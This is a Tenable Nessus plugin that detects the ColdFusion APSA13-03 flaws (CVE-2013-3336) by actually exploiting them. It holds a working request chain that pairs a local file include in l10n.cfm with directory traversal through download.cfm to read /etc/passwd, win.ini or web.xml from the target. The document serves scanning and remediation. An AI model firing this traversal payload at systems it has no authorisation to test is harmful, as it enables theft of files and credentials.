#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(66404);
  script_version("$Revision: 1.14 $");
  script_cvs_date("$Date: 2016/05/23 21:23:02 $");

  script_cve_id("CVE-2013-3336");
  script_bugtraq_id(59773);
  script_osvdb_id(93114);
  script_xref(name:"EDB-ID", value:"25305");

  script_name(english:"Adobe ColdFusion Multiple Vulnerabilities (APSA13-03)");
  script_summary(english:"Tries to download a file.");

  script_set_attribute(attribute:"synopsis", value:
"A web-based application running on the remote host is affected by
multiple vulnerabilities.");
  script_set_attribute(attribute:"description", value:
"The version of Adobe ColdFusion running on the remote host is affected
by the following vulnerabilities :

  - A directory traversal vulnerability exists in
    /administrator/mail/download.cfm. A remote,
    authenticated attacker can exploit this issue to
    download arbitrary files.

  - A local file include vulnerability exists in
    /adminapi/customtags/l10n.cfm. A remote, unauthenticated
    attacker can exploit this to execute local cfm files.

A remote, unauthenticated attacker can exploit both of these
vulnerabilities, resulting in the download of arbitrary files as
demonstrated in this plugin report.");
  script_set_attribute(attribute:"see_also", value:"http://www.adobe.com/support/security/advisories/apsa13-03.html");
  # http://helpx.adobe.com/coldfusion/kb/coldfusion-security-hotfix-apsb13-13.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?b9b1d947");
  script_set_attribute(attribute:"solution", value:
"Apply the appropriate hotfix referenced in Adobe security bulletin
APSB13-13.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/05/08");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/05/14");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/05/14");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:adobe:coldfusion");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2016 Tenable Network Security, Inc.");

  script_dependencies("os_fingerprint.nasl", "coldfusion_detect.nasl");
  script_require_ports("Services/www", 80, 8500);
  script_require_keys("installed_sw/ColdFusion");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = 'ColdFusion';
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

# CF9 (9, not 9.0.1 or 9.0.2) doesn't have the file download vulnerability but
# presumably has the LFI. for now the plugin accounts for this by flagging any
# CF9 installations that were detected when the report paranoia setting is "paranoid"
if (report_paranoia == 2 && install['version'] =~ "^9\.0\.0\.")
{
  if (report_verbosity > 0)
  {
    report =
      '\n  URL     : ' + install_url +
      '\n  Version : ' + install['version'] + '\n';
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
  exit(0);
}

os = get_kb_item('Host/OS');
if (os && report_paranoia < 2)
{
  if ("Windows" >< os)
    files = make_list('/windows/win.ini','/winnt/win.ini');
  else
    files = make_list('/etc/passwd');
}
else files = make_list('/etc/passwd', '/windows/win.ini', '/winnt/win.ini', 'wwwroot/WEB-INF/web.xml');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/winnt/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";
file_pats['/windows/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";
# as a last resort, try to get a file in the CF installation directory
# if none of the OS-specific files could be obtained
file_pats['wwwroot/WEB-INF/web.xml'] = '<web-app id="adobe_coldfusion">';


cfm = '/adminapi/customtags/l10n.cfm';
qs =
   'attributes.id=it' +
  '&attributes.locale=it' +
  '&attributes.var=it' +
  '&attributes.jscript=false' +
  '&attributes.type=text/html' +
  '&attributes.charset=UTF-8' +
  '&thisTag.executionmode=end' +
  '&thisTag.generatedContent=htp' +
  '&attributes.file=../../administrator/mail/download.cfm' +
  '&filename=';

traversal = crap(data:"../", length:3*9) + '..';
vuln = FALSE;

foreach file (files)
{
  if ("web.xml" >< file) traversal = "../../";
  url = cfm + '?' + qs + traversal + file;
  res = http_send_recv3(method:'GET', item:dir+url, port:port, exit_on_fail:TRUE);

  if (!egrep(pattern:file_pats[file], string:res[2])) continue; # exploit failed

  else
  {
    vuln = TRUE;
    output = res[2];
    break;
  }
}
if (!vuln) audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);

security_report_v4(
  port        : port,
  severity    : SECURITY_WARNING,
  file        : file,
  request     : make_list(install_url + url),
  output      : chomp(output),
  attach_type : 'text/plain'
);
exit(0);


